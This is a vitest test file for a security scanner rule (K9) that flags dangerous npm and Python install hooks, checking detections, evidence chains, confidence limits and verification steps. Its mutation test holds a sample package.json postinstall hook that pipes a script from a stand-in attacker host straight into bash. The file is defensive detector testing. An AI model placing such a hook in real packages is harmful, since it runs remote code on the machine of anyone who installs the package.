/**
 * K9 v2 — functional + evidence-integrity tests.
 */

import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { DangerousPostInstallRule } from "../index.js";
import type { AnalysisContext } from "../../../../engine.js";
import { isLocation } from "../../../location.js";
import type {
  EvidenceChain,
  SourceLink,
  SinkLink,
  MitigationLink,
  VerificationStep,
} from "../../../../evidence.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const FIX = join(HERE, "..", "__fixtures__");

const rule = new DangerousPostInstallRule();

function sourceContext(text: string): AnalysisContext {
  return {
    server: { id: "k9-t", name: "k9-test-server", description: null, github_url: null },
    tools: [],
    source_code: text,
    dependencies: [],
    connection_metadata: null,
  };
}

function loadFixture(name: string): AnalysisContext {
  return sourceContext(readFileSync(join(FIX, name), "utf8"));
}

function getLinksOfType<T extends { type: string }>(chain: EvidenceChain, type: string): T[] {
  return chain.links.filter((l) => l.type === type) as T[];
}

// ─── True positives ───────────────────────────────────────────────────────

describe("K9 — fires (true positives)", () => {
  it("flags curl | bash in a postinstall hook", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].rule_id).toBe("K9");
    expect(results[0].severity).toBe("critical");
  });

  it("flags base64 + Buffer.from decoding in a preinstall hook", () => {
    const results = rule.analyze(loadFixture("true-positive-02-base64-buffer.json"));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].rule_id).toBe("K9");
  });

  it("flags a Python setup.py cmdclass that invokes subprocess", () => {
    const results = rule.analyze(loadFixture("true-positive-03-setup-py-subprocess.py"));
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].rule_id).toBe("K9");
  });
});

// ─── True negatives ───────────────────────────────────────────────────────

describe("K9 — does not fire (true negatives)", () => {
  it("does NOT flag npx tsc in a postinstall hook", () => {
    const results = rule.analyze(loadFixture("true-negative-01-safe-tsc.json"));
    expect(results.length).toBe(0);
  });

  it("does NOT flag node-gyp rebuild in an install hook", () => {
    const results = rule.analyze(loadFixture("true-negative-02-node-gyp.json"));
    expect(results.length).toBe(0);
  });
});

// ─── Evidence integrity ───────────────────────────────────────────────────

describe("K9 — evidence integrity", () => {
  it("every link with a location is a structured Location; every VerificationStep.target is a Location", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    expect(results.length).toBeGreaterThan(0);
    for (const r of results) {
      for (const link of r.chain.links) {
        if (link.type === "impact") continue;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        expect(isLocation((link as any).location)).toBe(true);
      }
      for (const step of r.chain.verification_steps ?? []) {
        expect(isLocation(step.target)).toBe(true);
      }
    }
  });

  it("structural (JSON) findings carry a config-kind Location with a JSON pointer", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    expect(results.length).toBeGreaterThan(0);
    const sources = getLinksOfType<SourceLink>(results[0].chain, "source");
    const loc = sources[0].location;
    expect(typeof loc).not.toBe("string");
    if (typeof loc !== "string") {
      expect(loc.kind).toBe("config");
      if (loc.kind === "config") {
        expect(loc.json_pointer).toBe("/scripts/postinstall");
      }
    }
  });

  it("every chain has a source link and a command-execution sink link", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    const sources = getLinksOfType<SourceLink>(results[0].chain, "source");
    const sinks = getLinksOfType<SinkLink>(results[0].chain, "sink");
    expect(sources.length).toBeGreaterThanOrEqual(1);
    expect(sinks.length).toBeGreaterThanOrEqual(1);
    expect(sinks[0].sink_type).toBe("command-execution");
  });

  it("every chain records a mitigation link", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    const mitigations = getLinksOfType<MitigationLink>(results[0].chain, "mitigation");
    expect(mitigations.length).toBeGreaterThanOrEqual(1);
    // K9 install hooks have no mitigation by construction.
    expect(mitigations[0].present).toBe(false);
  });

  it("cites CWE-829 on the threat reference", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    expect(results[0].chain.threat_reference?.id).toBe("CWE-829");
  });
});

// ─── Confidence ──────────────────────────────────────────────────────────

describe("K9 — confidence", () => {
  it("caps confidence at 0.90 per charter", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    for (const r of results) {
      expect(r.chain.confidence).toBeLessThanOrEqual(0.9);
      expect(r.chain.confidence).toBeGreaterThanOrEqual(0.05);
    }
  });

  it("records install_hook_location_identified + dangerous_command_family factors", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json"));
    expect(results.length).toBeGreaterThan(0);
    const factors = results[0].chain.confidence_factors.map((f) => f.factor);
    expect(factors).toContain("install_hook_location_identified");
    expect(factors).toContain("dangerous_command_family");
    expect(factors).toContain("severity_adjustment");
  });
});

// ─── Mutation ────────────────────────────────────────────────────────────

describe("K9 — mutation (swap curl|bash for tsc removes the finding)", () => {
  it("critical finding disappears when dangerous hook is replaced with a build command", () => {
    const vulnerable = `{
      "scripts": { "postinstall": "curl https://evil.com/go.sh | bash" }
    }`;
    const safe = `{
      "scripts": { "postinstall": "npx tsc --build" }
    }`;
    const vulnerableCritical = rule
      .analyze(sourceContext(vulnerable))
      .filter((r) => r.severity === "critical");
    const safeCritical = rule
      .analyze(sourceContext(safe))
      .filter((r) => r.severity === "critical");
    expect(vulnerableCritical.length).toBeGreaterThan(0);
    expect(safeCritical.length).toBe(0);
  });
});

// ─── Verification steps ──────────────────────────────────────────────────

describe("K9 — verification steps", () => {
  it("every critical finding emits at least three verification steps", () => {
    const results = rule.analyze(loadFixture("true-positive-01-curl-pipe-bash.json")).filter(
      (r) => r.severity === "critical",
    );
    expect(results.length).toBeGreaterThan(0);
    for (const r of results) {
      const steps = r.chain.verification_steps as VerificationStep[];
      expect(steps.length).toBeGreaterThanOrEqual(3);
      for (const s of steps) {
        expect(isLocation(s.target)).toBe(true);
      }
    }
  });
});
